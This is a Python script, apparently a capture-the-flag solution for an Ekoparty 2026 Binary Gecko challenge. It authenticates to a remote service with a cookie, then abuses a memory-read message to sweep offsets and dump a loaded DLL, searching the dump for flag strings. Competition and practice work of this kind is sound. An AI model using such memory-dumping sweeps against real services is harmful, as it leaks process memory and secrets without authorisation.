#!/usr/bin/env python3
# Re-dump da DLL do chall2 (imagem mudou vs chall1). Varre counter 0..0x13000 (0x1000/read),
# encadeia na mesma conexao (flag=1), salva module_dump_chall2.bin, procura "FLAG:" e HIK.
import socket, struct, re, sys, time
HOST, PORT = "<IP>", 20269
COOKIE = b"Ekoparty 2026 - Binary Gecko CTF challenge"
HEALTHY = b"Welcome to this CTF\x00"
HIK = re.compile(rb'HIK_[\x20-\x7e]{4,300}')
OUT = "/home/felipebc2/repo/RedTeam/Challenges/Second Chall Gecko/module_dump_chall2.bin"
MAXOFF, STEP = 0x13000, 0x1000

def rd(s,n,to=8.0):
    s.settimeout(to); b=b""
    try:
        while len(b)<n:
            c=s.recv(n-len(b))
            if not c: break
            b+=c
    except (socket.timeout,ConnectionResetError,OSError): pass
    return b

def main(cooldown):
    attempts=6
    for i in range(1,attempts+1):
        print(f"[*] cooldown {cooldown}s... (attempt {i}/{attempts})"); time.sleep(cooldown)
        try:
            s=socket.create_connection((HOST,PORT),timeout=8); s.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY,1)
        except Exception as e: print("CONNECT FAIL:",e); continue
        s.sendall(COOKIE); banner=rd(s,20)
        if len(banner)==0: print("0B banner -> penalizado, PARAR."); s.close(); return
        if banner!=HEALTHY: print("  banner degradado, retry:",banner.hex()[:20]); s.close(); continue
        print("banner OK, sweeping..."); break
    else:
        print("[STOP] sem janela saudavel"); return
    chunks={}
    for off in range(0,MAXOFF,STEP):
        s.sendall(struct.pack("<IBII",0xd,1,off,STEP)); r=rd(s,STEP)
        if len(r)==0: print(f"  @0x{off:x}: fechou (nao-mapeado), parando."); break
        chunks[off]=r
    s.close()
    if not chunks: return
    end=max(chunks)+STEP; blob=bytearray(end)
    for off,r in chunks.items(): blob[off:off+len(r)]=r
    open(OUT,"wb").write(blob)
    print(f"[+] salvo {OUT} ({len(blob)} bytes)")
    flags=[m.start() for m in re.finditer(rb'FLAG', bytes(blob))]
    print("ocorrencias de 'FLAG':", [hex(x) for x in flags])
    hik=[m.group().decode(errors='replace') for m in HIK.finditer(bytes(blob))]
    print("HIK direto:", hik if hik else "nenhum (cifrado)")

if __name__=="__main__":
    main(int(sys.argv[1]) if len(sys.argv)>1 else 75)
